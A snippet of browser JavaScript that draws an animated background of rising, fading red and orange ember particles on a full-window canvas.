    <script>
        const canvas = document.getElementById('fireCanvas');
        const ctx = canvas.getContext('2d');
        
        let width, height;
        let particles = [];
        
        // Setup Canvas Size
        function resize() {
            width = window.innerWidth;
            height = window.innerHeight;
            canvas.width = width;
            canvas.height = height;
        }
        window.addEventListener('resize', resize);
        resize();

        // Particle Class
        class FireParticle {
            constructor() {
                this.reset();
                this.y = Math.random() * height; // Initial random spawn
            }
            
            reset() {
                this.x = Math.random() * width;
                this.y = height + Math.random() * 100; // Spawn below screen
                this.size = Math.random() * 3 + 1;
                this.speedY = -(Math.random() * 2 + 0.5); // Move up
                this.speedX = (Math.random() - 0.5) * 1; // Sway left/right
                this.life = Math.random() * 0.5 + 0.5; // Opacity
                this.decay = Math.random() * 0.005 + 0.002;
                
                // Color variations (Red, Orange, dark red)
                const colors = ['#ff1a1a', '#ff4d4d', '#990000', '#ff8000'];
                this.color = colors[Math.floor(Math.random() * colors.length)];
            }
            
            update() {
                this.x += this.speedX;
                this.y += this.speedY;
                this.life -= this.decay;
                
                // Gentle sway
                this.speedX += (Math.random() - 0.5) * 0.1;
                
                if (this.life <= 0 || this.y < -10) {
                    this.reset();
                }
            }
            
            draw() {
                ctx.globalAlpha = Math.max(0, this.life);
                ctx.fillStyle = this.color;
                ctx.beginPath();
                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
                ctx.fill();
                
                // Add tiny glow
                ctx.shadowBlur = 10;
                ctx.shadowColor = this.color;
            }
        }

        // Init Particles (Limit to 80 for performance)
        for(let i = 0; i < 80; i++) {
            particles.push(new FireParticle());
        }

        // Animation Loop
        function animate() {
            ctx.clearRect(0, 0, width, height);
            
            for(let i = 0; i < particles.length; i++) {
                particles[i].update();
                particles[i].draw();
            }
            
            requestAnimationFrame(animate);
        }
        animate();
    </script>
